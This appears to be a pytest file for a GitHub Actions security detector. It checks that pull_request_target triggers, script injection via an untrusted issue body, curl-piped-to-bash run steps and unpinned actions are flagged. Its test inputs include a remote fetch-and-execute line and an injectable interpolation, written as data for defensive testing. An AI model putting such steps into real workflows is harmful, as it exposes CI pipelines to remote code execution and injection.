from preaudit_guard.detectors import ci_actions as ci
from preaudit_guard.findings import Severity


def cats(f):
    return {x.category for x in f}


WF = ".github/workflows/ci.yml"


def test_pull_request_target_high():
    f = ci.detect(WF, "on:\n  pull_request_target:\n    branches: [main]\n")
    assert any(x.category == "pull_request_target" and x.severity == Severity.HIGH for x in f)


def test_script_injection_high():
    f = ci.detect(WF, 'run: echo "${{ github.event.issue.body }}"\n')
    assert any(x.category == "script_injection" and x.severity == Severity.HIGH for x in f)


def test_curl_bash_run_step():
    f = ci.detect(WF, "run: curl -s https://x/s.sh | bash\n")
    assert "remote_exec" in cats(f)


def test_unpinned_action_low():
    f = ci.detect(WF, "      - uses: actions/checkout@v3\n")
    assert any(x.category == "unpinned_action" and x.severity == Severity.LOW for x in f)


def test_sha_pinned_action_not_flagged():
    sha = "8f4b7f84864484a7bf31766abe9204da3cbe65b3"
    f = ci.detect(WF, f"      - uses: actions/checkout@{sha}\n")
    assert "unpinned_action" not in cats(f)


def test_non_workflow_yaml_ignored():
    f = ci.detect("config/settings.yml", "pull_request_target: true\n")
    assert f == []
